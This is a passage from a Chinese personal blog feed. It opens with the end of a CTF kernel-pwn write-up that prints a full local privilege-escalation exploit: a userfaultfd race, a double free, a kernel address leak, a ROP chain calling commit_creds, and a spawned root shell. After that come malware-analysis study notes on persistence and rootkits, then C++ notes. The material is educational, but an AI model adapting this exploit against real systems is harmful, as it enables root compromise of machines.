class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-keyword">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-keyword">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-keyword">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-keyword">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pop trapped in userfaultfd.&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct the double free...&quot;</span>);<br>        pop(page);<br><br>        uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">size_t</span>  pop_rdi_ret = <span class="hljs-number">0xffffffff81034505</span>;<br><span class="hljs-keyword">size_t</span>  xchg_rax_rdi_ret = <span class="hljs-number">0xffffffff81d8df6d</span>;<br><span class="hljs-keyword">size_t</span>  mov_rdi_rax_pop_rbp_ret = <span class="hljs-number">0xffffffff8121f89a</span>;<br><span class="hljs-keyword">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81600a34</span>;<br><span class="hljs-keyword">long</span>    flag_fd;<br><span class="hljs-keyword">char</span>    flag_buf[<span class="hljs-number">0x100</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">hijack_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-keyword">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-keyword">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-keyword">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-keyword">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] setxattr trapped in userfaultfd.&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger now...&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)<br>            close(seq_fd_reserve[i]);<br><br>        <span class="hljs-comment">// trigger</span><br>        pop_rdi_ret += kernel_offset;<br>        xchg_rax_rdi_ret += kernel_offset;<br>        mov_rdi_rax_pop_rbp_ret += kernel_offset;<br>        prepare_kernel_cred = <span class="hljs-number">0xffffffff81069e00</span> + kernel_offset;<br>        commit_creds = <span class="hljs-number">0xffffffff81069c10</span> + kernel_offset;<br>        swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="hljs-number">0x10</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] gadget: %p\n&quot;</span>, swapgs_restore_regs_and_return_to_usermode);<br>        __asm__(<br>            <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>            <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>            <span class="hljs-string">&quot;mov r13,   pop_rdi_ret;&quot;</span><br>            <span class="hljs-string">&quot;mov r12,   0;&quot;</span><br>            <span class="hljs-string">&quot;mov rbp,   prepare_kernel_cred;&quot;</span><br>            <span class="hljs-string">&quot;mov rbx,   mov_rdi_rax_pop_rbp_ret;&quot;</span>    <br>            <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>            <span class="hljs-string">&quot;mov r10,   commit_creds;&quot;</span><br>            <span class="hljs-string">&quot;mov r9,    swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>            <span class="hljs-string">&quot;mov r8,    0x99999999;&quot;</span><br>            <span class="hljs-string">&quot;xor rax,   rax;&quot;</span><br>            <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>            <span class="hljs-string">&quot;mov rdx,   8;&quot;</span><br>            <span class="hljs-string">&quot;mov rsi,   rsp;&quot;</span><br>            <span class="hljs-string">&quot;mov rdi,   seq_fd;&quot;</span><br>            <span class="hljs-string">&quot;syscall&quot;</span><br>        );<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] back to userland successfully!&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] uid: %d gid: %d\n&quot;</span>, getuid(), getgid());<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] execve root shell now...&quot;</span>);<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *data)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (ioctl(dev_fd, <span class="hljs-number">0x57AC0001</span>, data) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;push!&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pop</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *data)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (ioctl(dev_fd, <span class="hljs-number">0x57AC0002</span>, data) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pop!&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">size_t</span>      data[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-keyword">char</span>        *uffd_buf_leak;<br>    <span class="hljs-keyword">char</span>        *uffd_buf_uaf;<br>    <span class="hljs-keyword">char</span>        *uffd_buf_hack;<br>    <span class="hljs-keyword">int</span>         pipe_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">int</span>         shm_id;<br>    <span class="hljs-keyword">char</span>        *shm_addr;<br><br>    dev_fd = open(<span class="hljs-string">&quot;/proc/stack&quot;</span>, O_RDONLY);<br><br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    page_size = sysconf(_SC_PAGE_SIZE);<br><br>    <span class="hljs-comment">// reserve object to protect freelist</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)<br>        <span class="hljs-keyword">if</span> ((seq_fd_reserve[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;seq reserve!&quot;</span>);<br><br>    <span class="hljs-comment">// create uffd thread for leak</span><br>    uffd_buf_leak = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    registerUserFaultFd(uffd_buf_leak, page_size, leak_thread);<br><br>    <span class="hljs-comment">// left dirty data in kmalloc-32</span><br>    shm_id = shmget(<span class="hljs-number">114514</span>, <span class="hljs-number">0x1000</span>, SHM_R | SHM_W | IPC_CREAT);<br>    <span class="hljs-keyword">if</span> (shm_id &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;shmget!&quot;</span>);<br>    shm_addr = shmat(shm_id, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (shm_addr &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;shmat!&quot;</span>);<br>    <span class="hljs-keyword">if</span>(shmdt(shm_addr) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;shmdt!&quot;</span>);<br><br>    <span class="hljs-comment">// leak kernel base    </span><br>    push(uffd_buf_leak);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_base);<br><br>    <span class="hljs-comment">// create uffd thread for double free</span><br>    uffd_buf_uaf = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    registerUserFaultFd(uffd_buf_uaf, page_size, double_free_thread);<br><br>    <span class="hljs-comment">// construct the double free</span><br>    push(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br>    pop(uffd_buf_uaf);<br><br>    <span class="hljs-comment">// create uffd thread for hijack</span><br>    uffd_buf_hack = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, page_size * <span class="hljs-number">2</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    registerUserFaultFd(uffd_buf_hack + page_size, page_size, hijack_thread);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] gadget: %p\n&quot;</span>, <span class="hljs-number">0xffffffff814d51c0</span> + kernel_offset);<br>    *(<span class="hljs-keyword">size_t</span> *)(uffd_buf_hack + page_size - <span class="hljs-number">8</span>) = <span class="hljs-number">0xffffffff814d51c0</span> + kernel_offset;    <span class="hljs-comment">// add rsp , 0x1c8 ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop r15; pop rbp ; ret</span><br><br>    <span class="hljs-comment">// userfaultfd + setxattr to hijack the seq_ops-&gt;stat, trigger in uffd thread</span><br>    seq_fd = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    setxattr(<span class="hljs-string">&quot;/exp&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, uffd_buf_hack + page_size - <span class="hljs-number">8</span>, <span class="hljs-number">32</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行即可 get root shell</p><p><a href=""><img src="https://s2.loli.net/2023/02/06/NkURY6wPnh7yi8M.png" alt="image.png"></a></p><h1 id="一些结构体-amp-tricks"><a href="#一些结构体-amp-tricks" class="headerlink" title="一些结构体&amp;tricks"></a>一些结构体&amp;tricks</h1><h2 id="io-uring"><a href="#io-uring" class="headerlink" title="io_uring"></a>io_uring</h2><blockquote><p>最早是在RCTF2022 game中看到, 然鹅被umount的非预期薄纱了. 预期是ldt_struct和io_uring相配合的任意读写+cred修改. </p><p><a href="https://web.archive.org/web/20221119160242/https://www.graplsecurity.com/post/iou-ring-exploiting-the-linux-kernel">uring+FUSE</a>, 非常详细, 多到不想看. 但是这网站居然挂了, 用的webarchive. 有关FUSE在上面的条件竞争中也有. </p></blockquote><p>题目中用到的是update_tag, 上面文章中用的是buffer相关. </p><h2 id="ldt-struct"><a href="#ldt-struct" class="headerlink" title="ldt_struct"></a>ldt_struct</h2><blockquote><p> RCTF game中已见过. 另一道相关多解<a href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/#0x02-kernote">题目</a>. </p></blockquote>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Malware Analysis</title>
    <link href="/2022-12/Now-Malware-Analysis/"/>
    <url>/2022-12/Now-Malware-Analysis/</url>
    
    <content type="html"><![CDATA[<h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><ul><li><a href="https://blog.csdn.net/qq_43633973/article/details/102378477">PE结构分析</a> </li></ul><h2 id="使用软件工具"><a href="#使用软件工具" class="headerlink" title="使用软件工具"></a>使用软件工具</h2><ul><li>安装的<ul><li>Resource Hacker</li><li>IDA Free</li><li>PEBrowse64 Professional</li><li></li></ul></li><li>免安装<ul><li>PEView</li><li>Dependency walk</li><li>Process Monitor | Process Explorer<ul><li>monitor中的lower pane可以查看handle+dll, </li></ul></li><li>RegShot</li><li></li></ul></li></ul><p>过程中要注意的信息:</p><ul><li><p>命名约定</p><blockquote><p>当 微软更新一个函数，而且新函数与原先函数不兼容的时候，微软还会继续支待原先的旧函数 。 这时新函数会给一个与旧函数相同的名字，并在后面加上 Ex 后缀 。 而被显著更新过两次的函数，则会在它们的名字后面有两个 Ex 后缀 。</p><p>以 字 符串作为 参 数的许多函数，在它们的名字后面会包含 一 个 A 或者 一 个 w , 如CreateDirectoryW。 </p></blockquote></li><li><p>常见导入dll</p></li></ul><p><img src="../../image/Malware_Analysis/image-20221214164012612.png" alt="image-20221214164012612"></p><p><a href="https://www.52pojie.cn/thread-1494490-1-1.html">Win7精简带工具</a> </p><p><a href="https://www.52pojie.cn/thread-661779-1-1.html">Winxp 32精简带工具</a> </p><h3 id="装虚拟机遇到的问题"><a href="#装虚拟机遇到的问题" class="headerlink" title="装虚拟机遇到的问题:"></a>装虚拟机遇到的问题:</h3><ul><li>win7直接运行不了自解压程序. 遂弃用, 改为winxp. </li><li>32位的winxp手感真奇特. 不过工具包中的一些64位程序无法运行. </li><li>xp里面system32目录下没有strings, 从<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/strings">windows官网</a>下了一个, 原来这是在一个工具包里面的, 还有一些有趣的小工具. 好吧只有Windows Vista and higher能用. 不管了. </li><li>加了几个快照以防万一</li></ul><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><ul><li>Use Standard Symbolic Constant<ul><li>在Type Libraries里查看常量所在库是否被加载. 通常 mssdk和 vc6win会自动被加载, 要获取本地API的符号常量 , 加载ntapi<br>（微软Windows NT 4 . 0本地API), 分析一个 Linux二进制时，你可能需要手动加载 gnuunx (GNU C++ UNIX ) 库 .</li></ul></li><li>脚本<ul><li>IDC, IDAPython</li><li>IDC即我在pwncollege里面用到的断点代码.</li><li>IDAPython提供了一大堆IDA Pro的SDK功能,提供了远比IDC强大许多的脚本化能力。IDAPython提供3个模块来访问IDAAPl (idaapi)、IDC接口（idc）以及IDAPython工具函数（idautils)。</li><li></li></ul></li></ul><h2 id="Win下的程序分析"><a href="#Win下的程序分析" class="headerlink" title="Win下的程序分析"></a>Win下的程序分析</h2><h3 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h3><p>类型</p><ul><li><p>Windows 总体上使用匈牙利表达法 ， 作为 API 函数标识符。这个表达式使用 一 个前缀命名模式，来使识别 一个变量的类型更为容易。 包含一个 32 位无符号整数的变撮 ， 或DWORD , 会以 dw 开头. 还有像是:</p><p><img src="../../image/Malware_Analysis/image-20221214164634786.png" alt="image-20221214164634786"></p></li></ul><p>句柄</p><ul><li>句柄是在操作系统中被打开或被创建的项，比如一个窗口 、进程、模块 、 菜单、文件，等等 。句柄在它们引用 一个对象或其他某个内存位置这点上很像指针。然而，和指针不同的是，句柄不能被用来进行数学操作，并且它们不总是表示对象地址 。 你能对句柄做的唯一 的事情，就是保存它，并在后续函数调用中使用它来引用同 一个对象 。</li></ul><p>文件系统函数</p><ul><li>CreateFileMappingA | <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile">MapViewOfFile</a> : 这两个就像是mmap一样, 不过拆分成了两个函数来完成操作, 第一个函数创建一个file mapping object, 第二个函数使用其返回的handler来创建mapping.  </li><li>CreateFile : 它可以打开已经存在的文件，管道，流，以及I/O 设备，还能创建新的文件。参数<code>dwCreationDisposition</code>控制CreateFile 函数是否创建一个新的文件，或是打开一个已经存在的文件 。</li><li>ReadFile 和 WriteFile: 不能改变文件指针. </li></ul><p>特殊文件</p><ul><li>P158: 共享文件 通过名字空间访问的文件 备用 数据流</li></ul><h3 id="Windows-注册表"><a href="#Windows-注册表" class="headerlink" title="Windows 注册表"></a>Windows 注册表</h3><ul><li>注册表根键</li><li>Regedit</li><li>自启动程序: Autoruns</li><li>常用注册表函数: RegOpenKeyEx RegSetValueEx RegGetValue</li><li>.reg 文件的注册表脚本</li></ul><ul><li><p><a href="https://learn.microsoft.com/en-us/windows/win32/sync/mutex-objects">Mutex</a> </p></li><li><p>可使用—个互斥量来确保恶意代码只有一份实例在系统上运行. 看来是系统级别的一个变量, 如果要跨进程只要openMutex获取handle即可. </p></li><li><p>服务</p><ul><li>Windows操作系统支持多种服务类型，它们以独特的方式执行。恶意代码最常使用的是wIN32_SHARE_PROCESs类型，这种类型将这个服务的代码保存在一个DLL中，并且在一个共享的进程中组合多个不同的服务。在任务管理器中，你可以找到一个名为<code>svchost.exe</code>进程的多个实例，它们在运行WIN32_SHARE_PROCESS类型的服务。</li><li>WIN32_OWN_PROCESs类型有时也被使用，因为它在一个.exe文件中保存代码，而且作为一个独立进程运行。</li><li>最后一个常见的服务类型是KERNEL_DRIVER，它被用来加载代码到内核中执行。(我们在本章后面以及第10章将扩展地讨论运行在内核中的恶意代码。)</li><li>sc和qc命令. </li></ul></li><li><p>组件对象模型 <a href="https://learn.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal">COM</a> </p><ul><li>不行文档太多了看不完, 有空再说. </li><li>p175</li><li>COM被实现成 一个客户服务器框架 。 客户端是那些使用 COM对象 的 程序 ，服务器是那些可复用的软件组件一也就是COM对象本身 。 微软提供了很多COM对象给程序使用 。</li><li>COM对象通过它们 的全局唯一 标识符( GUID ) ，分为类型标识符 ( CLSID ) 以及接口标识符( CIID ) ,来进行访问 </li><li>CoCreateinstance 函数被用来获取对 COM 功能的访问 。 恶意代码使用的 一 个常用函数是Navigate , 它允许 一 个程序启动 Internet Explorer , 并访问 一 个 Web 地 址 。 Navigate 函数是IWebBrowser2 组件接口的 一部分，这个接口指定了 一个必须被实现的函数列表，但是它没有指定哪个程序会提供这 个功能。提供这个功能的程序就是实现了 IWebBrowser2 接口的COM类 。 在多数例子中 ， IWebBrowser2 接 口 被Internet Explorer实现 。 接口通过一个 叫 做lID 的GUID来标识 ，而COM类通过一个叫做CLSID 的GUID来标识。</li></ul></li><li><p>异常</p><ul><li>….</li></ul></li><li><p>原生API</p><img src="../../image/Malware_Analysis/image-20221215212228116.png" alt="image-20221215212228116" style="zoom:80%;" /><ul><li><code>Ntdll.dll</code>即为原生API接口导出dll. </li></ul></li></ul><h1 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h1><ul><li>沙箱<ul><li>沙箱不能告诉你恶意代码做了什么。它能报告基本功能，但是它不能告诉你恶意代码是 一 个定制的 S AM密文记录器，或是一个加密的键盘记录后 门 程序。这些结论需要你自己总结。</li><li>一些恶意代码需要系统上拥有特定的注册表项或者文件才会执行，而这些在沙箱内是找不到的。这些就可能需要包含一些合法数据，比如控制命令或者加密密钥。</li></ul></li><li><code>rundl132.exe DLLname, Export arguments </code> </li><li>RegMon(检测注册表行为) RegShot ProcessMonitor(这东西是行为监测) ProcessExplorer(这东西是进程浏览) dependency walker<ul><li>进程浏览器一个特别有用的功能就是镜像标签里的验证 ( Verify ) 按钮。单击此按钮，可以验证磁盘上的镜像文件是否具有微软的签名认证 。 验证按钮验证的是磁盘上的镜像文件，而不是内存中的，因 此它可能会失效，如果一个攻击者使用进程替换技术process replacement, 那这个东西就没用了. </li></ul></li><li>模拟网络:  这些资源可以包括DNS 域名系统、 IP 地址和数据包记录器。<ul><li>Apate DNS</li><li>NetCat, nc命令</li><li>Wireshark, dddd</li><li>INetSim, internet simulation</li></ul></li><li>调试<ul><li>标志寄存器中的陷阱标志 (trap fl ag) 用千单步调试 。 陷阱标志置位后，处理器每执行一条指令就会产生异常 。</li></ul></li><li>Ollydbg &amp;&amp; WinDbg<ul><li>暂且不急, 这两个熟练使用是个大坑</li></ul></li></ul><h1 id="恶意代码功能"><a href="#恶意代码功能" class="headerlink" title="恶意代码功能"></a>恶意代码功能</h1><h4 id="恶意代码可能行为"><a href="#恶意代码可能行为" class="headerlink" title="恶意代码可能行为"></a>恶意代码可能行为</h4><ul><li>下载器和启动器</li><li>后门: 反弹shell 远程控制 僵尸网络</li><li>登录凭证窃听: 没看懂<ul><li>GINA拦截: 在注册表里写入dll条目, 实现伪造的登录认证过程. </li><li>口令哈希转储: DLL注入. </li><li>击键记录: 钩子或者轮询(用户态)</li></ul></li><li>存活机制: 一 旦恶意代码获取系统的控制权，它通常就会在系统中驻留很长一段时间 ， 恶意代码的这种行为被称为存活 。 如果存活机制足够特别，它甚至能作为给定恶意代码的指纹。<ul><li>通常存在于<strong>注册表</strong>中.  一些受欢迎的注册表项仍值得去深入扩展： <code>Appinit_DLL</code> 、 <code>Winlogon</code> 和 <code>SvcHostDLL</code> 。svchost. exe 是从动态链接库中运行服务的通用主机进程 ， Windows操作系统通常同一时刻运行多个svchost.exe 实例。每个实例包含一 组服务. </li><li><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\svsvc </code>下是schost服务的注册表项, 所有的svchost.exe DLL包含拥有ServiceDLL 值的 Parameters 键 ，这 是恶意代码编写者设置恶意DLL程序的位置, Parameters 键下另 一个值Start 用来确定服务何时启动（恶意代码通常设置为系统引导时启动)。</li><li><strong>特洛伊木马化系统二进制文件</strong>: 利用这种技术，恶意代码能够修改系统的二进制文件，当被感染的二进制文件下次运行或者加载时，将会强制运行恶意代码 。 </li><li><strong>DLL 加载顺序劫持</strong>: </li></ul></li><li>提权</li><li>rootkit : 隐藏恶意代码行为的工具<ul><li>两种用户态rootkit: IAT和 inline Hook</li><li>…</li></ul></li><li></li></ul>]]></content>
    
    
    <categories>
      
      <category>practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>practice</tag>
      
      <tag>malware</tag>
      
      <tag>reverse engineering</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CXX Correlative</title>
    <link href="/2022-12/Now-CXX-Correlative/"/>
    <url>/2022-12/Now-CXX-Correlative/</url>
    
    <content type="html"><![CDATA[<p><a href="https://changkun.de/modern-cpp/en-us/02-usability/">Online Book</a> </p><h1 id="Modern-CXX"><a href="#Modern-CXX" class="headerlink" title="Modern CXX"></a>Modern CXX</h1><h2 id="Language-U3sability-Enhancements"><a href="#Language-U3sability-Enhancements" class="headerlink" title="Language U3sability Enhancements"></a>Language U3sability Enhancements</h2><h3 id="2-1-Constants"><a href="#2-1-Constants" class="headerlink" title="2.1 Constants"></a>2.1 Constants</h3><h4 id="nullptr"><a href="#nullptr" class="headerlink" title="nullptr"></a><a href="https://changkun.de/modern-cpp/en-us/02-usability/#nullptr">nullptr</a></h4><ul><li>no implicit conversion from <code>void*</code> to other types | conflict with C++ overloading</li><li>so replace NULL with nullptr. </li></ul><h4 id="constexpr"><a href="#constexpr" class="headerlink" title="constexpr"></a><a href="https://changkun.de/modern-cpp/en-us/02-usability/#constexpr">constexpr</a></h4><ul><li>same declaration position as <code>const</code>, introduced in C++11. </li><li>modern compilers will do most of optimizations, such as <code>alloca()</code>, so this is not a problem to use variable in declarations. </li><li>C++11 provides <code>constexpr</code> to let the user <strong>explicitly declare</strong> that the function or object constructor will become a constant expression at compile time. </li><li>Starting with C++14, the constexpr <strong><u>function</u></strong> <strong>can use simple statements</strong> such as local variables, loops, and branches internally. But in C++11 only return statement is allowed.</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">int</span> <span class="hljs-title">fibonacci</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> n == <span class="hljs-number">1</span> || n == <span class="hljs-number">2</span> ? <span class="hljs-number">1</span> : <span class="hljs-built_in">fibonacci</span>(n<span class="hljs-number">-1</span>) + <span class="hljs-built_in">fibonacci</span>(n<span class="hljs-number">-2</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-2-Variables-and-initialization"><a href="#2-2-Variables-and-initialization" class="headerlink" title="2.2 Variables and initialization"></a>2.2 Variables and initialization</h3><h4 id="if-switch"><a href="#if-switch" class="headerlink" title="if-switch"></a><a href="https://changkun.de/modern-cpp/en-us/02-usability/#if-switch">if-switch</a></h4><ul><li>define temporary variable in <code>if</code> statement like <code>for</code>. </li></ul><h4 id="Initializer-list"><a href="#Initializer-list" class="headerlink" title="Initializer list"></a><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Initializer-list">Initializer list</a></h4><ul><li>Different initialization methods are specific to each other and <strong>cannot be generic</strong>.</li><li>C++11 first binds the <strong>concept of the initialization list</strong> to the <strong><u>type</u></strong> and calls it <code>std::initializer_list</code>.<br>Just a language formation -&gt; a specific type can be used as var.</li><li>new form: <code>Foo foo2 &#123;3, 4&#125;;</code> </li></ul><h4 id="Structured-binding"><a href="#Structured-binding" class="headerlink" title="Structured binding"></a><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Structured-binding">Structured binding</a></h4><ul><li><code>auto [x, y, z] = f();</code>  where <code>f()</code> returns a tuple. No need to use <code>std::tie()</code> </li></ul><h3 id="2-3-Type-inference"><a href="#2-3-Type-inference" 